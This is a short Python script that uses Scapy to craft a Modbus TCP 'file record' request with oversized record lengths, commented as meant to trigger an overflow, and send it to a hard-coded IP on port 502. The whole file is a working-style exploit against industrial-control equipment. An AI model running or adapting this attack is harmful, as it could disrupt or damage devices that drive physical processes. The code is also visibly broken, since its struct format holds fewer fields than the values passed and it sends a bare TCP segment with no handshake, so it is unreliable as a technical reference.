from scapy.all import *

# Function to create a Modbus packet with the exploit
def create_exploit_packet():
    # Modbus TCP header
    transaction_id = 0x0001
    protocol_id = 0x0000
    length = 0x0014  # Adjusted length for additional payload
    unit_id = 0x01

    # Modbus function code and payload
    function_code = 0x15  # Example function code
    reference_type = 0x06  # Correct reference type for file record request
    file_number = 0x0001
    record_number = 0x0000
    record_length_1 = 0xfffe  # First record length to trigger overflow
    record_length_2 = 0xfffb  # Second record length to continue the loop

    # Construct the payload
    payload = struct.pack('>BHHHBHHH', function_code, reference_type, file_number, record_number, record_length_1, 0xFF, reference_type, file_number, record_number, record_length_2)

    # Construct the Modbus TCP packet
    modbus_packet = struct.pack('>HHHB', transaction_id, protocol_id, length, unit_id) + payload

    return modbus_packet

# Send the packet
def send_packet(packet):
    # Assuming the target IP and port
    target_ip = "10.103.152.8"
    target_port = 502

    # Send the packet using Scapy
    send(IP(dst=target_ip)/TCP(dport=target_port)/Raw(load=packet))

if __name__ == "__main__":
    packet = create_exploit_packet()
    send_packet(packet)
